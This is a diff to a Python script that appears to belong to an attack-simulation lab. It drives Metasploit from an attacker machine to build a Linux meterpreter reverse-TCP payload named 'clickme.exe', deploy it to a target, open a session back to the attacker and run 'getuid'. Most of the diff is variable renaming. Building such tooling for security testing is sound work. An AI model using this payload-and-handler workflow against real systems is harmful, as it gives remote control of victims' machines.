@@ -1,3 +1,6 @@
+#!/usr/bin/env python3
+""" Command line tool to interact with metasploit running on the attack server """
+
 from app.machinecontrol import Machine
 from app.attack_log import AttackLog
 from app.metasploit import MSFVenom, Metasploit
@@ -6,13 +9,13 @@ from app.metasploit import MSFVenom, Metasploit
 # For some local tests
 if __name__ == "__main__":
 
-    # msfrpcd -S -P password -u user -f
+    # msfrpcd -S -P PASSWORD -u USER -f
     # attacker_ip = "192.168.178.125"
     # target_ip = "192.168.178.125"
 
     # Metasploit RPC
-    password = "password"
-    user = "user"
+    PASSWORD = "PASSWORD"
+    USER = "USER"
 
     attack_logger = AttackLog(2)
     attacker = Machine({  # "root": "systems/attacker1",
@@ -39,14 +42,14 @@ if __name__ == "__main__":
     target.up()
 
     venom = MSFVenom(attacker, target, attack_logger)
-    payload_type = "linux/x64/meterpreter_reverse_tcp"
-    print(venom.generate_cmd(payload=payload_type,
-                             architecture="x64",
-                             platform="linux",
-                             # lhost,
-                             format="elf",
-                             outfile="clickme.exe"))
-    venom.generate_and_deploy(payload=payload_type,
+    PAYLOAD_TYPE = "linux/x64/meterpreter_reverse_tcp"
+    print(venom.generate_payload(payload=PAYLOAD_TYPE,
+                                 architecture="x64",
+                                 platform="linux",
+                                 # lhost,
+                                 format="elf",
+                                 outfile="clickme.exe"))
+    venom.generate_and_deploy(payload=PAYLOAD_TYPE,
                               architecture="x64",
                               platform="linux",
                               lhost=attacker.get_ip(),
@@ -56,8 +59,8 @@ if __name__ == "__main__":
     # TODO get meterpreter session
     # TODO simple command to test
 
-    metasploit = Metasploit(password, attacker=attacker, username=user)
-    metasploit.start_exploit_stub_for_external_payload(payload=payload_type)
+    metasploit = Metasploit(PASSWORD, attacker=attacker, username=USER)
+    metasploit.start_exploit_stub_for_external_payload(payload=PAYLOAD_TYPE)
     print(metasploit.meterpreter_execute(["getuid"], 0))
     # client = MsfRpcClient('yourpassword', ssl=True)
 
